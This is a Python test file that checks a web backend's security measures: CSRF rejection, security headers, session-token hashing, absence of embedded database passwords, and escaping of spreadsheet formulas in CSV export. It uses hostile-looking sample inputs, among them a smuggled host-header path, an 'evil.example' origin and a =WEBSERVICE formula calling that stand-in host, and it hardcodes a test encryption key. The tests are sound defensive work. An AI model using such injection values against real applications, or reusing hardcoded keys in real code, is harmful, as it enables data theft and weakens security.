from __future__ import annotations

import asyncio
import os
import re
import sys
from pathlib import Path

from fastapi import Response
from starlette.requests import Request


BACKEND_DIR = Path(__file__).resolve().parent.parent
REPO_DIR = BACKEND_DIR.parent
sys.path.insert(0, str(BACKEND_DIR))

os.environ.setdefault("MONGO_URL", "mongodb://localhost:27017")
os.environ.setdefault("DB_NAME", "latus_security_tests")
os.environ.setdefault("APP_ENCRYPTION_KEY", "T9VemN99LrWMmb3im576htR6oNUwsyQdIhvFO9QuTI0=")

import server  # noqa: E402
from catalog import export_csv  # noqa: E402


def _request(path: str, *, host: str = "testserver", origin: str | None = None,
             cookie: str | None = None) -> Request:
    headers = [(b"host", host.encode())]
    if origin:
        headers.append((b"origin", origin.encode()))
    if cookie:
        headers.append((b"cookie", cookie.encode()))
    return Request({
        "type": "http", "asgi": {"version": "3.0"}, "http_version": "1.1",
        "server": ("testserver", 80), "client": ("127.0.0.1", 1234),
        "scheme": "http", "method": "POST", "root_path": "", "path": path,
        "raw_path": path.encode(), "query_string": b"", "headers": headers,
    })


def test_security_checks_use_raw_asgi_path_not_reconstructed_host_path():
    request = _request(
        "/api/seed", host="example.com/api/billing/checkout?ignored=",
    )
    assert server._subscription_route_is_exempt(request) is False


def test_cross_site_cookie_write_is_rejected():
    request = _request(
        "/api/billing/cancel", origin="https://evil.example",
        cookie="session_token=secret",
    )

    async def next_handler(_request):
        return Response(content="should-not-run", status_code=200)

    response = asyncio.run(server.csrf_and_security_headers(request, next_handler))
    assert response.status_code == 403


def test_security_headers_are_applied_to_api_responses():
    request = _request("/api/health")

    async def next_handler(_request):
        return Response(content="{}", media_type="application/json")

    response = asyncio.run(server.csrf_and_security_headers(request, next_handler))
    assert response.headers["x-content-type-options"] == "nosniff"
    assert response.headers["x-frame-options"] == "DENY"
    assert response.headers["cache-control"] == "no-store"


def test_session_tokens_are_one_way_hashed():
    token = "a-session-token-that-must-not-be-stored"
    digest = server._session_token_hash(token)
    assert token not in digest
    assert len(digest) == 64


def test_repository_has_no_embedded_database_password():
    migration = (BACKEND_DIR / "scripts" / "migrate_statuses.py").read_text(encoding="utf-8")
    assert not re.search(r"mongodb(?:\+srv)?://[^\s:@/]+:[^\s@/]+@", migration)
    app_source = (BACKEND_DIR / "server.py").read_text(encoding="utf-8")
    assert "Latus1234" not in app_source
    assert "admin@latus.test" not in app_source


def test_catalog_csv_neutralizes_spreadsheet_formulas():
    data = export_csv([{
        "name": "=WEBSERVICE(\"https://evil.example\")",
        "sku": "SAFE", "price": 1, "currency": "ARS", "active": True,
    }]).decode("utf-8-sig")
    assert "'=WEBSERVICE" in data

